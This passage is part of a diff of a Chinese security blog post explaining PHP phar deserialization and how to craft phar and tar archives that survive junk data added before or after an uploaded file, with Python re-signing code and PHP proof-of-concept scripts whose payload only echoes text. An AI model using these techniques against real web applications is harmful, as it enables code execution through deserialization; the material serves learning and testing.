+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha1</span>
+</span></span><span class="line"><span class="cl"><span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.phar&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>  <span class="c1"># 需要重新生成签名的phar文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">file</span><span class="p">[:</span><span class="o">-</span><span class="mi">28</span><span class="p">]</span>  <span class="c1"># 获取需要签名的据</span>
+</span></span><span class="line"><span class="cl"><span class="n">final</span> <span class="o">=</span> <span class="n">file</span><span class="p">[</span><span class="o">-</span><span class="mi">8</span><span class="p">:]</span>  <span class="c1"># 获取最后8位GBMB标识和签名类型</span>
+</span></span><span class="line"><span class="cl"><span class="n">newfile</span> <span class="o">=</span> <span class="n">data</span> <span class="o">+</span> <span class="n">sha1</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span> <span class="o">+</span> <span class="n">final</span>  <span class="c1"># 数据 + 签名 + 类型 + GBMB</span>
+</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;poc.phar&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">newfile</span><span class="p">)</span>  <span class="c1"># 写入到新的phar文件</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>来进行绕i过</p>
+<h3 id="绕过头部脏数据" class="headerLink">
+    <a href="#%e7%bb%95%e8%bf%87%e5%a4%b4%e9%83%a8%e8%84%8f%e6%95%b0%e6%8d%ae" class="header-mark"></a>绕过头部脏数据</h3><p>这里我也就直接贴上上面师傅的代码下来了
+当文件上传之后，在文件数据前面拼接了脏数据，再进行文件函数配合phar协议读取时，就会因为签名原因导致无法反序列化，这种情况下，就需要在生成phar文件时，将已知的脏数据设置在stub中，计算完签名后将文件中的脏数据删除即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//前面的脏数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$dirtydata</span> <span class="o">=</span> <span class="s2">&#34;dirty&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//在stub头中添加脏数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="nv">$dirtydata</span><span class="o">.</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//添加压缩文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;anything&#34;</span> <span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//自动计算签名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//读取phar文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$exp</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;./phar.phar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$post_exp</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$exp</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$dirtydata</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//删除脏数据头
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$exp</span> <span class="o">=</span> <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;./break_phar.phar&#34;</span><span class="p">,</span><span class="nv">$post_exp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;AAAA&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dirty</span><span class="o">=</span><span class="s2">&#34;dirty&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$old</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;./phar/break_phar.phar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$new</span><span class="o">=</span><span class="nv">$old</span><span class="o">.</span><span class="nv">$dirty</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$new</span><span class="o">=</span> <span class="nv">$dirty</span><span class="o">.</span><span class="nv">$old</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;./phar/new.phar&#34;</span><span class="p">,</span><span class="nv">$new</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;phar://./phar/new.phar&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="绕过尾部脏数据" class="headerLink">
+    <a href="#%e7%bb%95%e8%bf%87%e5%b0%be%e9%83%a8%e8%84%8f%e6%95%b0%e6%8d%ae" class="header-mark"></a>绕过尾部脏数据</h3><p>绕过文件尾部的脏数据就不需要什么操作了，也不需要已知内容，我们可以使用tar格式自动忽略，因为tar格式有暂停解析位，在之后添加的数据都不会解析的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//因为用的tar格式，所以不需要指定stub头
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PharData</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;/phar.tar&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;phartest&#34;</span><span class="p">,</span> <span class="nx">Phar</span><span class="o">::</span><span class="na">TAR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test&#34;</span> <span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;AAAA&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dirty</span><span class="o">=</span><span class="s2">&#34;dirty&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$old</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;./phar/phar.tar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$new</span><span class="o">=</span><span class="nv">$old</span><span class="o">.</span><span class="nv">$dirty</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;./phar/new.tar&#34;</span><span class="p">,</span><span class="nv">$new</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;phar://./phar/new.tar&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="绕过前后脏数据" class="headerLink">
+    <a href="#%e7%bb%95%e8%bf%87%e5%89%8d%e5%90%8e%e8%84%8f%e6%95%b0%e6%8d%ae" class="header-mark"></a>绕过前后脏数据</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//前面的脏数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$dirtydata</span><span class="o">=</span><span class="s2">&#34;dirty&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PharData</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;/phar.tar&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;phartest&#34;</span><span class="p">,</span> <span class="nx">Phar</span><span class="o">::</span><span class="na">TAR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//设置开头数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="nv">$dirtydata</span> <span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//读取原文件，截取，删除
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$exp</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;./phar.tar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$post_exp</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$exp</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$dirtydata</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;./break_phar.tar&#34;</span><span class="p">,</span><span class="nv">$post_exp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;AAA&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$front</span><span class="o">=</span><span class="s2">&#34;dirty&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dirty</span><span class="o">=</span><span class="s2">&#34;dirty&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$old</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;./phar/break_phar.tar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$new</span><span class="o">=</span><span class="nv">$front</span><span class="o">.</span><span class="nv">$old</span><span class="o">.</span><span class="nv">$dirty</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;./phar/new.tar&#34;</span><span class="p">,</span><span class="nv">$new</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;phar://./phar/new.tar&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div>
 
         <div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on 2024-02-06</span>
+                <span>Updated on 2024-01-17</span>
             </div>
             <div class="post-info-license"></div>
         </div>
@@ -120,20 +1010,20 @@
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/php/">PHP</a>,&nbsp;<a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/posts/nosql-inject/" class="prev" rel="prev" title="Nosql Inject"><i class="fas fa-angle-left fa-fw"></i>Nosql Inject</a>
-            <a href="/posts/php-parameter/" class="next" rel="next" title="Php Parameter">Php Parameter<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/posts/n1ctf-ezmaira/" class="prev" rel="prev" title="n1ctf-ezmaira"><i class="fas fa-angle-left fa-fw"></i>n1ctf-ezmaira</a>
+            <a href="/posts/n1start/" class="next" rel="next" title="关于N1 star给的一道题的审计分析">关于N1 star给的一道题的审计分析<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
-</article></div>
+<div id="comments"></div></article></div>
         </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">
                     Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
             <div class="footer-line"></div>
             <div class="footer-line">
             </div>
@@ -144,7 +1034,7 @@
         </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
             <i class="fas fa-comment fa-fw"></i>
         </a>
-    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"desktop-header-typeit":"DELETE's blog","mobile-header-typeit":"DELETE's blog"},"typeit":{"cursorChar":null,"cursorSpeed":null,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":null,"speed":null}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
 </body>
 
 </html>
